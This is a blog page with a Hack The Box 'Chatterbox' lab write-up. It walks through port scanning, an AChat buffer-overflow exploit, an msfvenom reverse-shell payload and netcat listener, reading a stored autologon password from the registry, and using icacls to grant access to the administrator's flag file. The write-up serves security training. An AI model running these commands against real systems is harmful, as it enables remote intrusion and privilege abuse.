@@ -1,0 +1,782 @@
+<!DOCTYPE html>
+<html>
+<head>
+
+    <!-- Document Settings -->
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+
+    <!-- Base Meta -->
+    <!-- dynamically fixing the title for tag/author pages -->
+
+
+
+    <title>Chatterbox Writeup</title>
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <!-- Styles'n'Scripts -->
+    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css" />
+    <link rel="stylesheet" type="text/css" href="/assets/built/screen.edited.css" />
+    <link rel="stylesheet" type="text/css" href="/assets/built/syntax.css" />
+    <!-- highlight.js -->
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/default.min.css">
+    <style>.hljs { background: none; }</style>
+
+    <!--[if IE]>
+        <style>
+            p, ol, ul{
+                width: 100%;
+            }
+            blockquote{
+                width: 100%;
+            }
+        </style>
+    <![endif]-->
+    
+    <!-- This tag outputs SEO meta+structured data and other important settings -->
+    <meta name="description" content="Security researching from the nordics" />
+    <link rel="shortcut icon" href="/assets/images/static/blog-icon.png" type="image/png" />
+    <link rel="canonical" href="/chatterbox-writeup" />
+    <meta name="referrer" content="no-referrer-when-downgrade" />
+
+     <!--title below is coming from _includes/dynamic_title-->
+    <meta property="og:site_name" content="Securityits.io" />
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="Chatterbox Writeup" />
+    <meta property="og:description" content="My writeup of the Hack the box Chatterbox. A box that warranted a lot of resets and frustrations. Due to the fact that the initial shell was provided with a Buffer Overflow, and crashing the service at the same time. Connecting with my supplied VPN from HackTheBox1, and performing the" />
+    <meta property="og:url" content="/chatterbox-writeup" />
+    <meta property="og:image" content="/assets/images/posts/2018/06/chatterbox-writeup/chatterbox-writeup-banner.png" />
+    <meta property="article:publisher" content="https://www.facebook.com/false" />
+    <meta property="article:author" content="https://www.facebook.com/false" />
+    <meta property="article:published_time" content="2018-06-18T00:00:00+00:00" />
+    <meta property="article:modified_time" content="2018-06-18T00:00:00+00:00" />
+    <meta property="article:tag" content="Ctf" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Chatterbox Writeup" />
+    <meta name="twitter:description" content="My writeup of the Hack the box Chatterbox. A box that warranted a lot of resets and frustrations. Due to the fact that the initial shell was provided with a Buffer Overflow, and crashing the service at the same time. Connecting with my supplied VPN from HackTheBox1, and performing the" />
+    <meta name="twitter:url" content="/" />
+    <meta name="twitter:image" content="/assets/images/posts/2018/06/chatterbox-writeup/chatterbox-writeup-banner.png" />
+    <meta name="twitter:label1" content="Written by" />
+    <meta name="twitter:data1" content="Securityits.io" />
+    <meta name="twitter:label2" content="Filed under" />
+    <meta name="twitter:data2" content="Ctf" />
+    <meta name="twitter:site" content="@Securitybits_io" />
+    <meta name="twitter:creator" content="@Securitybits_io" />
+    <meta property="og:image:width" content="1400" />
+    <meta property="og:image:height" content="933" />
+
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Website",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Securityits.io",
+        "logo": "/assets/images/static/blog-icon.png"
+    },
+    "url": "/chatterbox-writeup",
+    "image": {
+        "@type": "ImageObject",
+        "url": "/assets/images/posts/2018/06/chatterbox-writeup/chatterbox-writeup-banner.png",
+        "width": 2000,
+        "height": 666
+    },
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "/chatterbox-writeup"
+    },
+    "description": "My writeup of the Hack the box Chatterbox. A box that warranted a lot of resets and frustrations. Due to the fact that the initial shell was provided with a Buffer Overflow, and crashing the service at the same time. Connecting with my supplied VPN from HackTheBox1, and performing the"
+}
+    </script>
+
+    <!-- <script type="text/javascript" src="https://demo.ghost.io/public/ghost-sdk.min.js?v=724281a32e"></script>
+    <script type="text/javascript">
+    ghost.init({
+    	clientId: "ghost-frontend",
+    	clientSecret: "f84a07a72b17"
+    });
+    </script> -->
+
+    <meta name="generator" content="Jekyll 3.6.2" />
+    <link rel="alternate" type="application/rss+xml" title="Chatterbox Writeup" href="/feed.xml" />
+
+
+</head>
+<body class="post-template">
+
+    <div class="site-wrapper">
+        <!-- All the main content gets inserted here, index.hbs, post.hbs, etc -->
+        <!-- default -->
+
+<!-- The tag above means: insert everything in this file
+into the {body} of the default.hbs template -->
+
+<header class="site-header outer">
+    <div class="inner">
+        <nav class="site-nav">
+    <div class="site-nav-left">
+        
+            
+                <a class="site-nav-logo" href="/"><img src="/assets/images/static/blog-icon.png" alt="Securityits.io" /></a>
+            
+        
+        
+            <ul class="nav" role="menu">
+    <li class="nav-home" role="menuitem"><a href="/">Home</a></li>
+    <li class="nav-about" role="menuitem"><a href="/about/">About</a></li>
+    <li class="nav-github" role="menuitem"><a href="https://github.com/securitybits-io">Github</a></li>
+</ul>
+
+        
+    </div>
+    <div class="site-nav-right">
+        <div class="social-links">
+            
+            
+                <a class="social-link social-link-tw" href="https://twitter.com/Securitybits_io" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>
+</a>
+            
+        </div>
+        
+    </div>
+</nav>
+
+    </div>
+</header>
+
+<!-- Everything inside the #post tags pulls data from the post -->
+<!-- #post -->
+
+<main id="site-main" class="site-main outer" role="main">
+    <div class="inner">
+
+        <article class="post-full  tag-ctf post ">
+
+            <header class="post-full-header">
+                <section class="post-full-meta">
+                    <time class="post-full-meta-date" datetime="18 June 2018">18 June 2018</time>
+                    
+                        <span class="date-divider">/</span>
+                        
+                            
+                               <a href='/tag/ctf/'>CTF</a>
+                            
+                        
+                    
+                </section>
+                <h1 class="post-full-title">Chatterbox Writeup</h1>
+            </header>
+
+            
+            <figure class="post-full-image" style="background-image: url(/assets/images/posts/2018/06/chatterbox-writeup/chatterbox-writeup-banner.png)">
+            </figure>
+            
+
+            <section class="post-full-content">
+                <div class="kg-card-markdown">
+                    <blockquote>
+  <p>My writeup of the Hack the box Chatterbox.</p>
+</blockquote>
+
+<p>A box that warranted a lot of resets and frustrations. Due to the fact that the initial shell was provided with a Buffer Overflow, and crashing the service at the same time.</p>
+
+<p>Connecting with my supplied VPN from HackTheBox<sup id="fnref:1" role="doc-noteref"><a href="#fn:1" class="footnote" rel="footnote">1</a></sup>, and performing the initial NMAP scan on the box IP: <code class="language-plaintext highlighter-rouge">10.10.10.74</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Chatterbox$ nmap -p- -T4 -Pn 10.10.10.74
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-18 16:57 CEST
+Nmap scan report for AChat (10.10.10.74)
+Host is up (0.041s latency).
+Not shown: 65533 filtered ports
+PORT     STATE SERVICE
+9255/tcp open  mon
+9256/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 287.36 seconds
+</code></pre></div></div>
+
+<p>So that gives us two ports, lets run a more thorough scan on both.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Chatterbox$ nmap -p9255,9256 -sV --version-all 10.10.10.74
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-18 17:05 CEST
+Nmap scan report for AChat (10.10.10.74)
+Host is up (0.042s latency).
+
+PORT     STATE SERVICE VERSION
+9255/tcp open  http    AChat chat system httpd
+9256/tcp open  achat   AChat chat system
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.09 seconds
+</code></pre></div></div>
+
+<p>Verification of these services can be done with a simple banner grab using netcat</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Chatterbox$ nc 10.10.10.74 9255
+&gt; GET / HTTP/1.1
+
+HTTP/1.1 204 No Content
+Connection: close
+Server: AChat
+</code></pre></div></div>
+
+<p>Now it serves a HTTP 204 No Content, but the server seems interesting. Reporting as AChat<sup id="fnref:2" role="doc-noteref"><a href="#fn:2" class="footnote" rel="footnote">2</a></sup> we can determine (Unless its a fake HTTP Server), that there’s some kind of chat server running behind that port.
+Using Searchsploit we can quite quickly see if there is some ready made exploit available.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Chatterbox$ searchsploit achat
+-------------------------------------------- ----------------------------------
+ Exploit Title                              |  Path
+                                            | (/usr/share/exploitdb/)
+-------------------------------------------- ----------------------------------
+Achat 0.150 beta7 - Remote Buffer Overflow  | exploits/windows/remote/36025.py
+[..snip..]
+-------------------------------------------- ----------------------------------
+Shellcodes: No Result
+Papers: No Result
+</code></pre></div></div>
+
+<p>So there is as I mentioned before a ready made Buffer OverFlow, that could be used.
+First of all copy it to the current directory and look into the sourcecode (remember to never run anything without reviewing the sourcecode).</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Chatterbox$ searchsploit -m 36025.py
+  Exploit: Achat 0.150 beta7 - Remote Buffer Overflow
+      URL: https://www.exploit-db.com/exploits/36025/
+     Path: /usr/share/exploitdb/exploits/windows/remote/36025.py
+File Type: Python script, ASCII text executable, with very long lines, with CRLF line terminators
+
+Copied to: /root/Documents/Documentation/CTF/htb/chatterbox/blog/36025.py
+</code></pre></div></div>
+
+<p>The exploit comes with some customization. Namely create your own shellcode to use in the exploit, and as the exploit suggests lets use msfvenom to create a reverse shell.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Chatterbox$ msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.7 LPORT=4000 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python &gt; shellcode.py
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of x86/unicode_mixed
+x86/unicode_mixed succeeded with size 774 (iteration=0)
+x86/unicode_mixed chosen with final size 774
+Payload size: 774 bytes
+Final size of python file: 3706 bytes
+</code></pre></div></div>
+
+<p>Now LHOST and LPORT are my own, substitute for your IP recieved by HackTheBox. The important part is that the shellcode generated is below 1152 bytes, as that is specified as the largest payload for this exploit. Mine that was generated is 774 bytes, so well below the threshold.
+Using a texteditor lets remove the existing <code class="language-plaintext highlighter-rouge">buf</code> lines from the exploit and replace with our generated ones.
+Now using the exploit, we also need to have a listener before the service is exploited.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Exploit:
+root@kali:~/Chatterbox$ python 36025.py
+----&gt;{P00F}!
+root@kali:~/Chatterbox$
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Listener:
+root@kali:~/Chatterbox$ nc -lvvp 4000
+listening on [any] 4000 ...
+connect to [10.10.14.7] from AChat [10.10.10.74] 49157
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32&gt;whoami
+whoami
+chatterbox\alfred
+C:\Windows\system32&gt;
+</code></pre></div></div>
+
+<p>Cool, has shell, as <code class="language-plaintext highlighter-rouge">Chatterbox\Alfred</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:\Users\Alfred\Desktop&gt;dir /Q
+Directory of c:\Users\Alfred\Desktop
+[..snip..]
+12/10/2017  07:50 PM                32 CHATTERBOX\Alfred      user.txt
+[..snip..]
+c:\Users\Alfred\Desktop&gt;
+</code></pre></div></div>
+
+<p>So that takes care of one flag. Lets go for root!
+Doing some registry enumeration, which can be automated with scripts like <code class="language-plaintext highlighter-rouge">Sherlock.ps1</code><sup id="fnref:3" role="doc-noteref"><a href="#fn:3" class="footnote" rel="footnote">3</a></sup>.
+We are presented with:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:\Users\Alfred\Desktop&gt;reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
+[..snip..]
+    DefaultUserName    REG_SZ    Alfred
+    AutoAdminLogon    REG_SZ    1
+    DefaultPassword    REG_SZ    Welcome1!
+[..snip..]
+c:\Users\Alfred\Desktop&gt;
+</code></pre></div></div>
+
+<p>Got a user and the password, what would the odds be that Alfred uses the same password for the administrator account?
+One could use <code class="language-plaintext highlighter-rouge">powershell</code> to get a shell as Administrator. But since you also have read access into the Administrator user as Alfred, we can also see if we can change permissions on <code class="language-plaintext highlighter-rouge">root.txt</code> using <code class="language-plaintext highlighter-rouge">icacls</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:\Users\Administrator&gt;icacls c:\Users\administrator\desktop\root.txt CHATTERBOX\Alfred:(RX)
+icacls c:\Users\administrator\desktop\root.txt CHATTERBOX\Alfred:(RX)
+Invalid parameter "CHATTERBOX\Alfred:(RX)"
+
+c:\Users\Administrator&gt;icacls c:\Users\Administrator\Desktop\root.txt /grant everyone:(f)
+icacls c:\Users\Administrator\Desktop\root.txt /grant everyone:(f)
+processed file: c:\Users\Administrator\Desktop\root.txt
+Successfully processed 1 files; Failed processing 0 files
+
+c:\Users\Administrator&gt;type Desktop\root.txt
+type Desktop\root.txt
+EatSleepPwnRepeat
+</code></pre></div></div>
+
+<div class="footnotes" role="doc-endnotes">
+  <ol>
+    <li id="fn:1" role="doc-endnote">
+      <p><a href="www.hackthebox.eu">www.hackthebox.eu</a> <a href="#fnref:1" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
+    </li>
+    <li id="fn:2" role="doc-endnote">
+      <p><a href="https://sourceforge.net/projects/achat/">www.sourceforge.net/projects/achat/</a> <a href="#fnref:2" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
+    </li>
+    <li id="fn:3" role="doc-endnote">
+      <p><a href="https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1">www.github.com/rasta-mouse</a> <a href="#fnref:3" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
+    </li>
+  </ol>
+</div>
+
+                </div>
+            </section>
+
+            <!-- Email subscribe form at the bottom of the page -->
+            
+
+            <footer class="post-full-footer">
+                <!-- Everything inside the #author tags pulls data from the author -->
+                <!-- #author-->
+                
+                    
+                        <section class="author-card">
+                            
+                                <img class="author-profile-image" src="/assets/images/pages/profile/christoffer/profile.jpg" alt="christoffer" />
+                            
+                            <section class="author-card-content">
+                                <h4 class="author-card-name"><a href="/author/christoffer">Christoffer Claesson</a></h4>
+                                
+                                    <p>I am Christoffer Claesson, a professional security researcher from Sweden who spends his days (and many nights) on red teaming, security deep dives, and homelab experiments. This blog is my way of giving back to the community by sharing lessons, notes, and the occasional side project that grew bigger than planned.</p>
+                                
+                            </section>
+                        </section>
+                        <div class="post-full-footer-right">
+                            <a class="author-card-button" href="/author/christoffer">Read More</a>
+                        </div>
+                    
+                
+                <!-- /author  -->
+            </footer>
+
+            <!-- If you use Disqus comments, just uncomment this block.
+            The only thing you need to change is "test-apkdzgmqhj" - which
+            should be replaced with your own Disqus site-id. -->
+            
+
+        </article>
+
+    </div>
+</main>
+
+<!-- Links to Previous/Next posts -->
+<aside class="read-next outer">
+    <div class="inner">
+        <div class="read-next-feed">
+            
+                
+                
+                
+                
+                    <article class="read-next-card"
+                        
+                            style="background-image: url(/assets/images/static/blog-cover.jpg)"
+                        
+                    >
+                        <header class="read-next-card-header">
+                            <small class="read-next-card-header-sitetitle">&mdash; Securityits.io &mdash;</small>
+                            
+                                <h3 class="read-next-card-header-title"><a href="/tag/ctf/">Ctf</a></h3>
+                            
+                        </header>
+                        <div class="read-next-divider"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 14.5s2 3 5 3 5.5-2.463 5.5-5.5S21 6.5 18 6.5c-5 0-7 11-12 11C2.962 17.5.5 15.037.5 12S3 6.5 6 6.5s4.5 3.5 4.5 3.5"/></svg>
+</div>
+                        <div class="read-next-card-content">
+                            <ul>
+                                
+                                
+                                  
+                                
+                                  
+                                
+                                  
+                                
+                                  
+                                    
+                                        
+                                        
+                                            <li><a href="/reverse-engineering-an-unknown-digital-protocol">Reverse Engineering an unknown digital protocol: RHME2, Whac a mole</a></li>
+                                        
+                                    
+                                  
+                                
+                                  
+                                
+                                  
+                                
+                                  
+                                
+                                  
+                                
+                                  
+                                
+                                  
+                                
+                                  
+                                
+                                  
+                                
+                                  
+                                    
+                                        
+                                        
+                                            <li><a href="/valentine-writeup">Valentine Writeup</a></li>
+                                        
+                                    
+                                  
+                                
+                                  
+                                    
+                                        
+                                        
+                                            <li><a href="/falafel-writeup">Falafel Writeup</a></li>
+                                        
+                                    
+                                  
+                                
+                                  
+                                    
+                                  
+                                
+                                  
+                                    
+                                        
+                                        
+                                    
+                                  
+                                
+                                  
+                                    
+                                        
+                                        
+                                    
+                                  
+                                
+                                  
+                                
+                            </ul>
+                        </div>
+                        <footer class="read-next-card-footer">
+                            <a href="/tag/ctf/">
+                                
+                                    See all 5 posts  →
+                                
+                            </a>
+                        </footer>
+                    </article>
+                
+            
+
+            <!-- If there's a next post, display it using the same markup included from - partials/post-card.hbs -->
+            
+                
+
+    <article class="post-card post-template">
+        
+            <a class="post-card-image-link" href="/falafel-writeup">
+                <div class="post-card-image" style="background-image: url(/assets/images/posts/2018/06/falafel-writeup/HTB-Falafel-blog-post.jpg)"></div>
+            </a>
+        
+        <div class="post-card-content">
+            <a class="post-card-content-link" href="/falafel-writeup">
+                <header class="post-card-header">
+                    
+                        
+                            
+                                <span class="post-card-tags">Ctf</span>
+                            
+                        
+                    
+
+                    <h2 class="post-card-title">Falafel Writeup</h2>
+                </header>
+                <section class="post-card-excerpt">
+                    
+                        <p>
+  My writeup of the Hack the box Falafel.
+
+
+</p>
+                    
+                </section>
+            </a>
+            <footer class="post-card-meta">
+                
+                    
+                        
+                        <img class="author-profile-image" src="/assets/images/pages/profile/christoffer/profile.jpg" alt="Christoffer Claesson" />
+                        
+                        <span class="post-card-author">
+                            <a href="/author/christoffer/">Christoffer Claesson</a>
+                        </span>
+                    
+                
+                <span class="reading-time">
+                    
+                    
+                      7 min read
+                    
+                </span>
+            </footer>
+        </div>
+    </article>
+
+            
+
+            <!-- If there's a previous post, display it using the same markup included from - partials/post-card.hbs -->
+            
+                
+
+    <article class="post-card post-template">
+        
+            <a class="post-card-image-link" href="/rsa-prime-decryption">
+                <div class="post-card-image" style="background-image: url(/assets/images/posts/2018/04/rsa-prime-decryption/rsa-prime-banner.jpg)"></div>
+            </a>
+        
+        <div class="post-card-content">
+            <a class="post-card-content-link" href="/rsa-prime-decryption">
+                <header class="post-card-header">
+                    
+                        
+                            
+                                <span class="post-card-tags">Ctf</span>
+                            
+                        
+                    
+
+                    <h2 class="post-card-title">RSA Prime Decryption</h2>
+                </header>
+                <section class="post-card-excerpt">
+                    
+                        <p>
+  Description and usage of a decryption script that I wrote for CTF Challenges.
+
+
+</p>
+                    
+                </section>
+            </a>
+            <footer class="post-card-meta">
+                
+                    
+                        
+                        <img class="author-profile-image" src="/assets/images/pages/profile/christoffer/profile.jpg" alt="Christoffer Claesson" />
+                        
+                        <span class="post-card-author">
+                            <a href="/author/christoffer/">Christoffer Claesson</a>
+                        </span>
+                    
+                
+                <span class="reading-time">
+                    
+                    
+                      1 min read
+                    
+                </span>
+            </footer>
+        </div>
+    </article>
+
+            
+
+        </div>
+    </div>
+</aside>
+
+<!-- Floating header which appears on-scroll, included from includes/floating-header.hbs -->
+<div class="floating-header">
+    <div class="floating-header-logo">
+        <a href="/">
+            
+                <img src="/assets/images/static/blog-icon.png" alt="Securityits.io icon" />
+            
+            <span>Securityits.io</span>
+        </a>
+    </div>
+    <span class="floating-header-divider">&mdash;</span>
+    <div class="floating-header-title">Chatterbox Writeup</div>
+    <div class="floating-header-share">
+        <div class="floating-header-share-label">Share this <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+    <path d="M7.5 15.5V4a1.5 1.5 0 1 1 3 0v4.5h2a1 1 0 0 1 1 1h2a1 1 0 0 1 1 1H18a1.5 1.5 0 0 1 1.5 1.5v3.099c0 .929-.13 1.854-.385 2.748L17.5 23.5h-9c-1.5-2-5.417-8.673-5.417-8.673a1.2 1.2 0 0 1 1.76-1.605L7.5 15.5zm6-6v2m-3-3.5v3.5m6-1v2"/>
+</svg>
+</div>
+        <a class="floating-header-share-tw" href="https://twitter.com/share?text=Chatterbox+Writeup&amp;url=https://jekyllt.github.io/jasper2/chatterbox-writeup"
+            onclick="window.open(this.href, 'share-twitter', 'width=550,height=235');return false;">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>
+
+        </a>
+        <a class="floating-header-share-fb" href="https://www.facebook.com/sharer/sharer.php?u=https://jekyllt.github.io/jasper2/chatterbox-writeup"
+            onclick="window.open(this.href, 'share-facebook','width=580,height=296');return false;">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M19 6h5V0h-5c-3.86 0-7 3.14-7 7v3H8v6h4v16h6V16h5l1-6h-6V7c0-.542.458-1 1-1z"/></svg>
+
+        </a>
+    </div>
+    <progress class="progress" value="0">
+        <div class="progress-container">
+            <span class="progress-bar"></span>
+        </div>
+    </progress>
+</div>
+
+
+<!-- /post -->
+
+<!-- The #contentFor helper here will send everything inside it up to the matching #block helper found in default.hbs -->
+
+
+        <!-- Previous/next page links - displayed on every page -->
+        
+
+        <!-- The footer at the very bottom of the screen -->
+        <footer class="site-footer outer">
+            <div class="site-footer-content inner">
+                <section class="copyright"><a href="/">Securityits.io</a> &copy; 2025</section>
+                <section class="poweredby">Proudly published with <a href="https://jekyllrb.com/">Jekyll</a> &
+                    <a href="https://pages.github.com/" target="_blank" rel="noopener">GitHub Pages</a> using
+                    <a href="https://github.com/jekyllt/jasper2" target="_blank" rel="noopener">Jasper2</a></section>
+                <nav class="site-footer-nav">
+                    <a href="/">Latest Posts</a>
+                    
+                    <a href="https://twitter.com/Securitybits_io" target="_blank" rel="noopener">Twitter</a>
+                    <a href="https://ghost.org" target="_blank" rel="noopener">Ghost</a>
+                </nav>
+            </div>
+        </footer>
+
+    </div>
+
+    <!-- The big email subscribe modal content -->
+    
+
+    <!-- highlight.js -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.10.0/components/prism-abap.min.js"></script>
+    <script>$(document).ready(function() {
+      $('pre code').each(function(i, block) {
+        hljs.highlightBlock(block);
+      });
+    });</script>
+
+    <!-- jQuery + Fitvids, which makes all video embeds responsive -->
+    <script
+        src="https://code.jquery.com/jquery-3.2.1.min.js"
+        integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
+        crossorigin="anonymous">
+    </script>
+    <script type="text/javascript" src="/assets/js/jquery.fitvids.js"></script>
+    <script type="text/javascript" src="https://demo.ghost.io/assets/js/jquery.fitvids.js?v=724281a32e"></script>
+
+
+    <!-- Paginator increased to "infinit" in _config.yml -->
+    <!-- if paginator.posts  -->
+    <!-- <script>
+        var maxPages = parseInt('');
+    </script>
+    <script src="/assets/js/infinitescroll.js"></script> -->
+    <!-- /endif -->
+
+    
+
+
+    <!-- Add Google Analytics  -->
+    <!-- Google Analytics Tracking code -->
+ <script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-115328400-1', 'auto');
+  ga('send', 'pageview');
+
+ </script>
+
+
+    <!-- The #block helper will pull in data from the #contentFor other template files. In this case, there's some JavaScript which we only want to use in post.hbs, but it needs to be included down here, after jQuery has already loaded. -->
+    
+        <script>
+
+// NOTE: Scroll performance is poor in Safari
+// - this appears to be due to the events firing much more slowly in Safari.
+//   Dropping the scroll event and using only a raf loop results in smoother
+//   scrolling but continuous processing even when not scrolling
+$(document).ready(function () {
+    // Start fitVids
+    var $postContent = $(".post-full-content");
+    $postContent.fitVids();
+    // End fitVids
+
+    var progressBar = document.querySelector('progress');
+    var header = document.querySelector('.floating-header');
+    var title = document.querySelector('.post-full-title');
+
+    var lastScrollY = window.scrollY;
+    var lastWindowHeight = window.innerHeight;
+    var lastDocumentHeight = $(document).height();
+    var ticking = false;
+
+    function onScroll() {
+        lastScrollY = window.scrollY;
+        requestTick();
+    }
+
+    function onResize() {
+        lastWindowHeight = window.innerHeight;
+        lastDocumentHeight = $(document).height();
+        requestTick();
+    }
+
+    function requestTick() {
+        if (!ticking) {
+            requestAnimationFrame(update);
+        }
+        ticking = true;
+    }
+
+    function update() {
+        var trigger = title.getBoundingClientRect().top + window.scrollY;
+        var triggerOffset = title.offsetHeight + 35;
+        var progressMax = lastDocumentHeight - lastWindowHeight;
+
+        // show/hide floating header
+        if (lastScrollY >= trigger + triggerOffset) {
+            header.classList.add('floating-active');
+        } else {
+            header.classList.remove('floating-active');
+        }
+
+        progressBar.setAttribute('max', progressMax);
+        progressBar.setAttribute('value', lastScrollY);
+
+        ticking = false;
+    }
+
+    window.addEventListener('scroll', onScroll, {passive: true});
+    window.addEventListener('resize', onResize, false);
+
+    update();
+});
+</script>
+
+    
+
+    <!-- Ghost outputs important scripts and data with this tag - it should always be the very last thing before the closing body tag -->
+    <!-- ghost_foot -->
+
+</body>
+</html>
